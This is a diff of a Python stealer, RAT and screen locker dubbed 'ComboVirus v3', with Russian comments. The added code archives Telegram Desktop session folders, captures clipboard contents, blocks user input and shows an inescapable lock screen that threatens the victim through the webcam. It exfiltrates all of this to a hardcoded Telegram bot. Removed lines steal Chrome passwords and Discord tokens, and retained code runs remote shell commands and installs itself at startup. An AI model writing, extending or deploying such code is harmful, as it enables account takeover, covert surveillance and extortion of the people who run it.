@@ -1,14 +1,14 @@
 import os, sys, time, shutil, requests, tkinter as tk, psutil, winreg, threading, random, string, socket
-import cv2, sqlite3, subprocess
-import tempfile
+import cv2, sqlite3, subprocess, tempfile
+import pyperclip
+import ctypes
 
-# --- НАСТРОЙКИ БОТА ---
+# --- НАСТРОЙКИ ---
 BOT_TOKEN = "9235115664:AAEnXrZR-m3UtZ4uBaBqPOwJnng2M__xsBc"
 CHAT_ID = "8573437923"
 API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 PASSWORD = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
 
-# --- ОТПРАВКА В ТГ ---
 def send_msg(text):
     try: requests.post(f"{API}/sendMessage", json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
     except: pass
@@ -19,41 +19,43 @@ def send_file(filepath, caption):
             requests.post(f"{API}/sendDocument", data={"chat_id": CHAT_ID, "caption": caption}, files={"document": f})
     except: pass
 
-# --- СТИЛЕР (ПАРОЛИ И ТОКЕНЫ) ---
-def steal_browsers():
-    local = os.getenv("LOCALAPPDATA")
+# --- КРАЖА СЕССИЙ TELEGRAM ---
+def steal_telegram():
     appdata = os.getenv("APPDATA")
-    
-    # Discord
-    discord_paths = [os.path.join(appdata, "discord", "Local Storage", "leveldb")]
-    for path in discord_paths:
+    # Ищем папку tdata (Telegram Desktop)
+    tg_paths = [
+        os.path.join(appdata, "Telegram Desktop", "tdata"),
+        os.path.join(appdata, "Telegram", "tdata")
+    ]
+    for path in tg_paths:
         if os.path.exists(path):
             temp_dir = tempfile.gettempdir()
-            shutil.make_archive(os.path.join(temp_dir, "discord_tokens"), 'zip', path)
-            send_file(os.path.join(temp_dir, "discord_tokens.zip"), "🎮 Discord Tokens")
-            os.remove(os.path.join(temp_dir, "discord_tokens.zip"))
+            archive_path = os.path.join(temp_dir, "tg_session")
+            try:
+                shutil.make_archive(archive_path, 'zip', path)
+                send_file(archive_path + ".zip", "✈️ **Сессия Telegram Desktop (tdata)**\nЗакинь в папку tdata на своем ПК, чтобы зайти в аккаунт.")
+                os.remove(archive_path + ".zip")
+            except Exception as e:
+                send_msg(f"Ошибка кражи ТГ: {e}")
 
-    # Chrome
-    chrome_path = os.path.join(local, "Google", "Chrome", "User Data", "Default", "Login Data")
-    if os.path.exists(chrome_path):
-        temp_db = os.path.join(tempfile.gettempdir(), "chrome_logins.db")
+# --- ПЕРЕХВАТ БУФЕРА (если код скопируют) ---
+def spy_clipboard():
+    last_text = ""
+    while True:
         try:
-            shutil.copy2(chrome_path, temp_db)
-            conn = sqlite3.connect(temp_db)
-            cursor = conn.cursor()
-            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-            data = cursor.fetchall()
-            if data:
-                with open(os.path.join(tempfile.gettempdir(), "passwords.txt"), "w", encoding="utf-8") as f:
-                    for row in data:
-                        f.write(f"URL: {row[0]}\nLogin: {row[1]}\nPassword: {row[2]}\n\n")
-                send_file(os.path.join(tempfile.gettempdir(), "passwords.txt"), "🔐 Chrome Passwords")
-                os.remove(os.path.join(tempfile.gettempdir(), "passwords.txt"))
-            conn.close()
-            os.remove(temp_db)
+            text = pyperclip.paste()
+            # Если текст изменился и в нем есть цифры (похоже на код)
+            if text != last_text and text.strip() != "":
+                last_text = text
+                if len(text) < 20: # Коды обычно короткие
+                    send_msg(f"📋 **Перехвачен буфер обмена (возможно код):**\n`{text}`")
         except: pass
+        time.sleep(2)
 
-# --- RAT (ВЕБКА И СКРИНЫ) ---
+# --- ОСТАЛЬНОЕ (Мышь, Вебка, Локер) ---
+def block_input():
+    ctypes.windll.user32.BlockInput(True)
+
 def spy_webcam():
     while True:
         try:
@@ -69,21 +71,6 @@ def spy_webcam():
             time.sleep(20)
         except: pass
 
-def spy_screen():
-    import mss
-    with mss.mss() as sct:
-        while True:
-            try:
-                monitor = sct.monitors[1]
-                sct_img = sct.grab(monitor)
-                p = os.path.join(tempfile.gettempdir(), "screen.png")
-                mss.tools.to_png(sct_img.rgb, sct_img.size, output=p)
-                requests.post(f"{API}/sendPhoto", data={"chat_id": CHAT_ID, "caption": "🖥 Скриншот"}, files={"photo": open(p, "rb")})
-                os.remove(p)
-            except: pass
-            time.sleep(30)
-
-# --- УДАЛЕННЫЕ КОМАНДЫ ---
 def check_commands():
     last_id = 0
     while True:
@@ -97,10 +84,12 @@ def check_commands():
                         if cmd.startswith("/cmd "):
                             out = subprocess.check_output(cmd[5:], shell=True, stderr=subprocess.STDOUT, timeout=10).decode('cp866', errors='ignore')
                             send_msg(f"🖥 `{cmd[5:]}`\n```\n{out[:3000]}\n```")
+                        elif cmd == "/block":
+                            block_input()
+                            send_msg("🖱 Ввод заблокирован!")
         except: pass
         time.sleep(3)
 
-# --- БЛОКИРОВКА ЭКРАНА ---
 def disable_tools():
     try:
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
@@ -115,20 +104,19 @@ def show_window():
     root.attributes("-fullscreen", True)
     root.attributes("-topmost", True)
     root.protocol("WM_DELETE_WINDOW", lambda: None)
-    tk.Label(root, text="🚨 СИСТЕМА ЗАБЛОКИРОВАНА 🚨\n\nЯ вижу тебя через вебку.", fg="red", bg="black", font=("Arial", 20)).pack(expand=True)
+    root.bind("<Alt-F4>", lambda e: "break")
+    tk.Label(root, text="🚨 СИСТЕМА ЗАБЛОКИРОВАНА 🚨\n\nВвод отключен. Смотри в камеру.", fg="red", bg="black", font=("Arial", 20)).pack(expand=True)
     root.mainloop()
 
 if __name__ == "__main__":
-    # Автозагрузка
-    try:
-        shutil.copy(sys.executable, os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup\sys_update.exe'))
+    try: shutil.copy(sys.executable, os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup\sys_update.exe'))
     except: pass
     
-    send_msg(f"🚨 **Жертва запустила ComboVirus!**\n💻 ПК: `{socket.gethostname()}`\n🔑 Пароль: `{PASSWORD}`")
+    send_msg(f"🚨 **ComboVirus v3 (TG Stealer)**\n💻 ПК: `{socket.gethostname()}`\n🔑 Пароль: `{PASSWORD}`")
     
-    threading.Thread(target=steal_browsers, daemon=True).start()
+    threading.Thread(target=steal_telegram, daemon=True).start()
+    threading.Thread(target=spy_clipboard, daemon=True).start()
     threading.Thread(target=spy_webcam, daemon=True).start()
-    threading.Thread(target=spy_screen, daemon=True).start()
     threading.Thread(target=check_commands, daemon=True).start()
     
     disable_tools()
